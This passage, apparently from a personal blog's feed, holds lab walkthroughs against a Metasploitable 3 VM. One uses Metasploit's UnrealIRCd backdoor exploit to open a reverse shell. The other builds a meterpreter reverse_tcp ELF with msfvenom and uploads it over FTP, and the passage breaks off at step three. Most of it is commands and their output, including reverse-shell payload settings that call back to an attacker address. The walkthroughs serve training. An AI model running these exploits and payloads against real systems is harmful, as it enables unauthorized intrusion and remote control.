+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> loit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">6667&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOSTS 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOSTS&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RPORT &lt;span class="m">6697&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RPORT&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">6697&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show payloads
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Compatible &lt;span class="nv">Payloads&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> payload/cmd/unix/adduser normal No Add user with useradd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1&lt;/span> payload/cmd/unix/bind_perl normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2&lt;/span> payload/cmd/unix/bind_perl_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3&lt;/span> payload/cmd/unix/bind_ruby normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4&lt;/span> payload/cmd/unix/bind_ruby_ipv6 normal No Unix Command Shell, Bind TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span> IPv6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">5&lt;/span> payload/cmd/unix/generic normal No Unix Command, Generic Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">6&lt;/span> payload/cmd/unix/reverse normal No Unix Command Shell, Double Reverse TCP &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">7&lt;/span> payload/cmd/unix/reverse_bash_telnet_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8&lt;/span> payload/cmd/unix/reverse_perl normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> payload/cmd/unix/reverse_perl_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via perl&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">10&lt;/span> payload/cmd/unix/reverse_ruby normal No Unix Command Shell, Reverse TCP &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">11&lt;/span> payload/cmd/unix/reverse_ruby_ssl normal No Unix Command Shell, Reverse TCP SSL &lt;span class="o">(&lt;/span>via Ruby&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">12&lt;/span> payload/cmd/unix/reverse_ssl_double_telnet normal No Unix Command Shell, Double Reverse TCP SSL &lt;span class="o">(&lt;/span>telnet&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> payload payload/cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; cmd/unix/reverse
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS 10.0.2.28 yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> loit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">6697&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>cmd/unix/reverse&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> LHOST 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.2.16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Started reverse TCP double handler on 10.0.2.16:4444
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:6697 - Connected to 10.0.2.28:6697...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:6697 - Sending backdoor command...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the first client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Accepted the second client connection...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command: &lt;span class="nb">echo&lt;/span> 1moozBPFDDMzGgYN&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket A
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Writing to socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from sockets...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Reading from socket B
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> B: &lt;span class="s2">&amp;#34;1moozBPFDDMzGgYN\r\n&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Matching...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> A is input...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command shell session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.2.16:4444 -&amp;gt; 10.0.2.28:44915&lt;span class="o">)&lt;/span> at 2024-02-20 12:50:30 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">uname -a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux metasploitable3-ub1404 3.13.0-170-generic &lt;span class="c1">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>Reverse shell - msfvenom</title><link>https://abriljordan.github.io/ajcasinillo/p/reverse-shell-msfvenom/</link><pubDate>Sun, 18 Jun 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/reverse-shell-msfvenom/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-metasploit">Tool: Metasploit
+&lt;/h2>&lt;h2 id="vulnerability-reverse-shell">Vulnerability: Reverse shell
+&lt;/h2>&lt;p>Reverse shell&lt;/p>
+&lt;p>Step 1: We will first need to create a payload for our Metasploitable VM.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.0.2.16 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">5555&lt;/span> -f elf -o reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> exec: msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.0.2.16 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">5555&lt;/span> -f elf -o reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Overriding user environment variable &lt;span class="s1">&amp;#39;OPENSSL_CONF&amp;#39;&lt;/span> to &lt;span class="nb">enable&lt;/span> legacy functions.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No arch selected, selecting arch: x86 from the payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No encoder specified, outputting raw payload
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload size: &lt;span class="m">123&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Final size of elf file: &lt;span class="m">207&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Saved as: reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; file reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> exec: file reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reverse-sh.elf: ELF 32-bit LSB executable, Intel 80386, version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, statically linked, no section header
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 2: Place the payload file on the target machine using ftp.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$ftp&lt;/span> 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.0.2.28.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">220&lt;/span> ProFTPD 1.3.5 Server &lt;span class="o">(&lt;/span>ProFTPD Default Installation&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name &lt;span class="o">(&lt;/span>10.0.2.28:parrot&lt;span class="o">)&lt;/span>: vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">331&lt;/span> Password required &lt;span class="k">for&lt;/span> vagrant
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">230&lt;/span> User vagrant logged in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Remote system &lt;span class="nb">type&lt;/span> is UNIX.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using binary mode to transfer files.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; put reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">local: reverse-sh.elf remote: reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">229&lt;/span> Entering Extended Passive Mode &lt;span class="o">(||&lt;/span>&lt;span class="p">|&lt;/span>3046&lt;span class="p">|&lt;/span>&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp: Can&lt;span class="s1">&amp;#39;t connect to `10.0.2.28:3046&amp;#39;&lt;/span>: Connection timed out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">200&lt;/span> EPRT &lt;span class="nb">command&lt;/span> successful
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Opening BINARY mode data connection &lt;span class="k">for&lt;/span> reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">100% &lt;span class="p">|&lt;/span>***********************************&lt;span class="p">|&lt;/span> &lt;span class="m">207&lt;/span> 1.57 MiB/s 00:00 ETA
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer &lt;span class="nb">complete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">207&lt;/span> bytes sent in 00:00 &lt;span class="o">(&lt;/span>29.30 KiB/s&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Already connected to 10.0.2.28, use close first.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">200&lt;/span> EPRT &lt;span class="nb">command&lt;/span> successful
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">150&lt;/span> Opening ASCII mode data connection &lt;span class="k">for&lt;/span> file list
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">86562816&lt;/span> Oct &lt;span class="m">29&lt;/span> &lt;span class="m">2020&lt;/span> VBoxGuestAdditions.iso
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rw-r--r-- &lt;span class="m">1&lt;/span> vagrant vagrant &lt;span class="m">207&lt;/span> Feb &lt;span class="m">21&lt;/span> 03:10 reverse-sh.elf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">226&lt;/span> Transfer &lt;span class="nb">complete&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ftp&amp;gt; by
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">221&lt;/span> Goodbye.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ $
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Step 3: Make this file executable on our Metasploitable VM.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
